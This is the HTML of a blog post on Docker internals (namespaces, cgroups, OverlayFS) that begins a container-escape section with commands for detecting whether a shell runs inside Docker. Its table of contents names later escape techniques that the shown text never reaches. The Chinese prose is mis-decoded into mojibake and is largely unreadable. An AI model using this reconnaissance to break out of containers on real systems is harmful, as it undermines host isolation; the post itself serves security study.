<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="äº‘ğŸ˜¶â€ğŸŒ«ï¸">
<meta property="og:type" content="article">
<meta property="og:title" content="Docker-escape">
<meta property="og:url" content="https://ha0-y.github.io/2024/03/06/Docker-escape/index.html">
<meta property="og:site_name" content="chips">
<meta property="og:description" content="äº‘ğŸ˜¶â€ğŸŒ«ï¸">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&riu=http://xuxinkun.github.io/img/docker-oci-runc-k8s/kubelet.png&ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA=&risl=&pid=ImgRaw&r=0">
<meta property="article:published_time" content="2024-03-05T16:00:00.000Z">
<meta property="article:modified_time" content="2024-04-29T09:36:00.593Z">
<meta property="article:author" content="chips">
<meta property="article:tag" content="Docker">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&riu=http://xuxinkun.github.io/img/docker-oci-runc-k8s/kubelet.png&ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA=&risl=&pid=ImgRaw&r=0">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Docker-escape</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/03/09/afl-gcc/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/02/22/HMV-Zeug/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/03/06/Docker-escape/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&text=Docker-escape"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&is_video=false&description=Docker-escape"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Docker-escape&body=Check out this article: https://ha0-y.github.io/2024/03/06/Docker-escape/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&title=Docker-escape"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/03/06/Docker-escape/&name=Docker-escape&description=&lt;blockquote&gt;
&lt;p&gt;äº‘ğŸ˜¶â€ğŸŒ«ï¸&lt;/p&gt;
&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/03/06/Docker-escape/&t=Docker-escape"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">Dockeræ ¸å¿ƒåŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#namespace"><span class="toc-number">1.1.</span> <span class="toc-text">namespace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cgroup"><span class="toc-number">1.2.</span> <span class="toc-text">cgroup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Union-FS"><span class="toc-number">1.3.</span> <span class="toc-text">Union FS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MORE"><span class="toc-number">1.4.</span> <span class="toc-text">MORE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">Dockeré€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8BDocker%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.</span> <span class="toc-text">æ£€æµ‹Dockerç¯å¢ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E9%85%8D%E7%BD%AE"><span class="toc-number">2.2.</span> <span class="toc-text">Docker å¯åŠ¨å®¹å™¨çš„å±é™©é…ç½®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD"><span class="toc-number">2.3.</span> <span class="toc-text">Dockerå±é™©æŒ‚è½½</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#docker-sock"><span class="toc-number">2.3.1.</span> <span class="toc-text">docker.sock</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.2.</span> <span class="toc-text">æ ¹ç›®å½•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#procfs"><span class="toc-number">2.3.3.</span> <span class="toc-text">procfs</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-remote-API"><span class="toc-number">2.4.</span> <span class="toc-text">Docker remote API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4Docker-%E9%80%83%E9%80%B8"><span class="toc-number">2.5.</span> <span class="toc-text">ç¨‹åºæ¼æ´å¯¼è‡´Docker é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#runc"><span class="toc-number">2.5.1.</span> <span class="toc-text">runc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#containerd"><span class="toc-number">2.5.2.</span> <span class="toc-text">containerd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.</span> <span class="toc-text">å†…æ ¸æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP"><span class="toc-number">2.6.1.</span> <span class="toc-text">ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dirty-pipe"><span class="toc-number">2.6.2.</span> <span class="toc-text">dirty pipe</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Docker-escape
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">chips</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-05T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-03-06</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categorievariants/CSE/">CSE</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Docker/" rel="tag">Docker</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <blockquote>
<p>äº‘ğŸ˜¶â€ğŸŒ«ï¸</p>
</blockquote>
<span id="more"></span>

<p>OCIï¼ˆOpen Container Initiativeï¼‰è§„èŒƒæ˜¯äº‹å®ä¸Šçš„å®¹å™¨æ ‡å‡†ï¼Œå·²ç»è¢«å¤§éƒ¨åˆ†å®¹å™¨å®ç°ä»¥åŠå®¹å™¨ç¼–æ’ç³»ç»Ÿæ‰€é‡‡ç”¨ï¼ŒåŒ…æ‹¬ Docker å’Œ Kubernetesã€‚</p>
<p>ä» OCI è§„èŒƒå¼€å§‹äº†è§£å®¹å™¨é•œåƒï¼Œå¯ä»¥è®©æˆ‘ä»¬å¯¹å®¹å™¨æŠ€æœ¯å»ºç«‹æ›´å…¨é¢æ¸…æ™°çš„è®¤çŸ¥ï¼Œè€Œä¸æ˜¯å›¿äºå®ç°ç»†èŠ‚ã€‚OCI è§„èŒƒåˆ†ä¸ºÂ <code>Image spec</code>Â å’ŒÂ <code>Runtime spec</code>Â ä¸¤éƒ¨åˆ†ï¼Œå®ƒä»¬åˆ†åˆ«è¦†ç›–äº†å®¹å™¨ç”Ÿå‘½å‘¨æœŸçš„ä¸åŒé˜¶æ®µ</p>
<h2 id="Dockeræ ¸å¿ƒåŸç†"><a href="#Dockeræ ¸å¿ƒåŸç†" class="headerlink" title="Dockeræ ¸å¿ƒåŸç†"></a>Dockeræ ¸å¿ƒåŸç†</h2><p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäºÂ <a target="_blank" rel="noopener" href="https://www.runoob.com/go/go-tutorial.html">Go è¯­è¨€</a>Â å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚</p>
<p>Dockerçš„å®ç°ä¾èµ–äºLinuxä¸­ä¼—å¤šçš„åŸºç¡€æœºåˆ¶ï¼ŒåŒ…æ‹¬ç”¨äºèµ„æºé™åˆ¶çš„cgroupï¼Œç”¨äºéš”ç¦»çš„Namespaceï¼Œä»¥åŠç”¨äºå®ç°dockeræ–‡ä»¶ç³»ç»Ÿçš„Union FSç­‰ã€‚</p>
<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p>èµ„æºéš”ç¦»</p>
<p>Linuxçš„ namespace å¯ä»¥å®ç°èµ„æºèƒ½å¤Ÿåœ¨ä¸åŒçš„å‘½åç©ºé—´é‡Œæœ‰ç›¸åŒçš„åç§°ï¼Œè­¬å¦‚åœ¨Â <code>Aå‘½åç©ºé—´</code>Â æœ‰ä¸ªpidä¸º1çš„è¿›ç¨‹ï¼Œè€Œåœ¨Â <code>Bå‘½åç©ºé—´</code>Â ä¸­ä¹Ÿå¯ä»¥æœ‰ä¸€ä¸ªpidä¸º1çš„è¿›ç¨‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/include/linux/nsproxy.h#L31">nsproxy.h</a>ï¼Œ7ç§namespaceï¼Œå¯¹äºæ¯ä¸ªä»»åŠ¡ <code>task_struct</code> éƒ½å­˜åœ¨ä¸€ä¸ªnsproxy æˆå‘˜</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A structure to contain pointers to all per-process</span></span><br><span class="line"><span class="comment"> * namespaces - fs (mount), uts, network, sysvipc, etc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The pid namespace is an exception -- it&#x27;s accessed using</span></span><br><span class="line"><span class="comment"> * task_active_pid_ns.  The pid namespace here is the</span></span><br><span class="line"><span class="comment"> * namespace that children will use.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &#x27;count&#x27; is the number of tasks holding a reference.</span></span><br><span class="line"><span class="comment"> * The count for each namespace, then, will be the number</span></span><br><span class="line"><span class="comment"> * of nsproxies pointing to it, not the number of tasks.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The nsproxy is shared by tasks which share all namespaces.</span></span><br><span class="line"><span class="comment"> * As soon as a single namespace is cloned or unshared, the</span></span><br><span class="line"><span class="comment"> * nsproxy is copied.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">nsproxy</span> &#123;</span><br><span class="line">	<span class="type">refcount_t</span> count;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">uts_namespace</span> *uts_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">ipc_namespace</span> *ipc_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">mnt_namespace</span> *mnt_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">pid_namespace</span> *pid_ns_for_children;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">net</span> 	     *net_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns_for_children;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">cgroup_namespace</span> *cgroup_ns;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>namespaceä¹Ÿæ˜¯linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå°†å†…æ ¸èµ„æºåˆ†éš”å¼€ï¼Œä¸€ç»„è¿›ç¨‹èƒ½çœ‹åˆ°ä¸€äº›èµ„æºï¼Œè€Œå…¶ä»–ç»„çš„è¿›ç¨‹çœ‹åˆ°çš„æ˜¯ä¸åŒçš„èµ„æºï¼Œç»„ä¸ç»„ä¹‹é—´äº’ä¸å¹²æ‰°ï¼Œä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ã€‚ç®€å•æ¥è¯´ï¼Œnamespaceå°±æ˜¯å†…æ ¸æä¾›çš„ä¸€ç§è¿›ç¨‹é—´èµ„æºéš”ç¦»æŠ€æœ¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -al /proc/self/ns</span><br><span class="line">total 0</span><br><span class="line">dr-x--x--x 2 ubuntu ubuntu 0 Mar  6 09:28 .</span><br><span class="line">dr-xr-xr-x 9 ubuntu ubuntu 0 Mar  6 09:28 ..</span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 cgroup -&gt; <span class="string">&#x27;cgroup:[4026531835]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 ipc -&gt; <span class="string">&#x27;ipc:[4026531839]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 mnt -&gt; <span class="string">&#x27;mnt:[4026531841]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 net -&gt; <span class="string">&#x27;net:[4026531840]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid_for_children -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time_for_children -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 user -&gt; <span class="string">&#x27;user:[4026531837]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 uts -&gt; <span class="string">&#x27;uts:[4026531838]&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¸å…¶æœ‰å…³çš„ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æœ‰ä¸ªunshareçš„å‘½ä»¤ï¼Œéœ€è¦åŒºåˆ†ä¸€ä¸‹</span></span><br><span class="line">$ man 2 unshare</span><br><span class="line">$ man <span class="built_in">clone</span></span><br></pre></td></tr></table></figure>

<p>unshareåˆ›å»ºå‘½åç©ºé—´</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026531838]</span><br><span class="line">:/ <span class="comment"># unshare --uts /bin/bash</span></span><br><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026532690]</span><br></pre></td></tr></table></figure>

<h3 id="cgroup"><a href="#cgroup" class="headerlink" title="cgroup"></a>cgroup</h3><p>èµ„æºé™åˆ¶</p>
<p>cgroupï¼ˆcontrol groupï¼‰æ˜¯linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå¯ä»¥ç”¨äºé™åˆ¶ã€è®¡ç®—ã€éš”ç¦»è¿›ç¨‹ç»„å¯¹è®¡ç®—æœºèµ„æºçš„ä½¿ç”¨ï¼ˆå¦‚CPUã€memoryã€disk I&#x2F;Oã€networkç­‰ï¼‰ã€‚</p>
<p>cgroupæœ‰å¦‚ä¸‹å››ä¸ªåŠŸèƒ½ï¼š</p>
<ol>
<li>èµ„æºé™åˆ¶ï¼ˆResource limitsï¼‰ï¼šé™åˆ¶è¿›ç¨‹ç»„å¯¹æŸä¸€ç‰¹å®šèµ„æºï¼ˆCPUï¼Œdiskï¼Œæˆ–networkï¼‰çš„ä½¿ç”¨é‡</li>
<li>ä¼˜å…ˆçº§ï¼ˆPrioritizationï¼‰ï¼šé€šè¿‡ç»™æŸä¸ªcgroupä¸­çš„è¿›ç¨‹åˆ†é…å¤šä¸€äº›èµ„æºï¼ˆç›¸æ¯”äºå…¶ä»–cgroupï¼‰ï¼Œä»è€Œæé«˜ä¼˜å…ˆçº§</li>
<li>å®¡è®¡ï¼ˆAccountingï¼‰ï¼šè®°å½•è¿›ç¨‹&#x2F;è¿›ç¨‹ç»„ä½¿ç”¨çš„èµ„æºé‡</li>
<li>æ§åˆ¶ï¼ˆControlï¼‰ï¼šè¿›ç¨‹ç»„æ§åˆ¶ï¼Œå¦‚å¯ä»¥ä½¿ç”¨freezerå°†è¿›ç¨‹ç»„æŒ‚èµ·æˆ–æ¢å¤</li>
</ol>
<p>cgroupæ˜¯å®¹å™¨ï¼ˆcontainersï¼‰çš„ä¸€ä¸ªé‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå› ä¸ºå®¹å™¨ä¸­é€šå¸¸ä¼šè¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œè¿™äº›è¿›ç¨‹é€šå¸¸éœ€è¦ä¸€å¹¶æ§åˆ¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/self/cgroup</span><br><span class="line">0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-4f943e0d-c769-40ec-92df-ca2643d86752.scope</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/fs/cgroup		<span class="comment"># æŸ¥çœ‹cgroupæ–‡ä»¶ç³»ç»Ÿï¼Œç›®å½•ä¸‹æ¯ä¸ªç›®å½•ä»£è¡¨ä¸€ä¸ªcgroupç±»å‹ã€‚æ¯ä¸€ä¸ªcgroupç±»éƒ½éµå¾ªå±‚çº§ç»“æ„</span></span><br></pre></td></tr></table></figure>


<h3 id="Union-FS"><a href="#Union-FS" class="headerlink" title="Union FS"></a>Union FS</h3><p>Union File System ï¼Œç®€ç§° UnionFSï¼Œ<strong>æŠŠå…¶ä»–æ–‡ä»¶ç³»ç»Ÿè”åˆåˆ°ä¸€ä¸ªè”åˆæŒ‚è½½ç‚¹çš„æ–‡ä»¶ç³»ç»ŸæœåŠ¡</strong>ï¼Œç›®çš„æ˜¯<strong>å°†å¤šä¸ªæ–‡ä»¶è”åˆåœ¨ä¸€èµ·æˆä¸ºä¸€ä¸ªç»Ÿä¸€çš„è§†å›¾</strong></p>
<p>å®ƒçš„æ€æƒ³æ˜¯ï¼Œå¦‚æœä¸€ä¸ªèµ„æºæ˜¯é‡å¤çš„ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¿®æ”¹ï¼Œè¿™æ—¶å€™å¹¶ä¸éœ€è¦ç«‹å³åˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºï¼Œè¿™ä¸ªèµ„æºå¯ä»¥è¢«æ–°æ—§å®ä¾‹å…±äº«ã€‚</p>
<p>åˆ›å»ºæ–°èµ„æºå‘ç”Ÿåœ¨ç¬¬ä¸€æ¬¡å†™æ“ä½œï¼Œä¹Ÿå°±æ˜¯å¯¹èµ„æºè¿›è¡Œä¿®æ”¹çš„æ—¶å€™ã€‚é€šè¿‡è¿™ç§èµ„æºå…±äº«çš„æ–¹å¼ï¼Œå¯ä»¥æ˜¾è‘—åœ°å‡å°‘æœªä¿®æ”¹èµ„æºå¤åˆ¶å¸¦æ¥çš„æ¶ˆè€—ï¼Œä½†æ˜¯ä¹Ÿä¼šåœ¨è¿›è¡Œèµ„æºä¿®æ”¹çš„æ—¶å€™å¢å‡å°éƒ¨åˆ†çš„å¼€é”€ã€‚</p>
<p>OverlayFSï¼šOverlayfs æ˜¯ä¸€ç§å †å æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒä¾èµ–å¹¶å»ºç«‹åœ¨å…¶å®ƒçš„æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šï¼ˆä¾‹å¦‚ ext4fs å’Œ xfs ç­‰ç­‰ï¼‰ï¼Œå¹¶ä¸ç›´æ¥å‚ä¸ç£ç›˜ç©ºé—´ç»“æ„çš„åˆ’åˆ†ï¼Œä»…ä»…å°†åŸæ¥åº•å±‚æ–‡ä»¶ç³»ç»Ÿä¸­ä¸åŒçš„ç›®å½•è¿›è¡Œâ€œåˆå¹¶â€ï¼Œç„¶åå‘ç”¨æˆ·å‘ˆç°ã€‚<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/679328995">OverlayFS</a></p>
<h3 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h3><p>å¦‚æœè§‰å¾—ä¸æ˜ç™½ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„Docker</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.infoq.com/articles/build-a-container-golang/">Build Your Own Container Using Less than 100 Lines of Go</a></li>
<li><a target="_blank" rel="noopener" href="https://www.wolai.com/curry00/rjPry5XyA6BLYyUoEaDWDm">æ‰‹å†™docker</a></li>
</ul>
<h2 id="Dockeré€ƒé€¸"><a href="#Dockeré€ƒé€¸" class="headerlink" title="Dockeré€ƒé€¸"></a>Dockeré€ƒé€¸</h2><h3 id="æ£€æµ‹Dockerç¯å¢ƒ"><a href="#æ£€æµ‹Dockerç¯å¢ƒ" class="headerlink" title="æ£€æµ‹Dockerç¯å¢ƒ"></a>æ£€æµ‹Dockerç¯å¢ƒ</h3><ul>
<li>æ£€æŸ¥æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨<code>.dockerenv</code>æ–‡ä»¶</li>
<li>æ£€æŸ¥Â <code>/proc/1/cgroup</code>Â æ˜¯å¦å­˜åœ¨å«æœ‰dockerå­—ç¬¦ä¸²!</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@06fcbcd12128:/<span class="comment"># ls -al /</span></span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar  6 01:52 .dockerenv</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ???</span></span><br><span class="line">root@06fcbcd12128:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">0::/</span><br></pre></td></tr></table></figure>

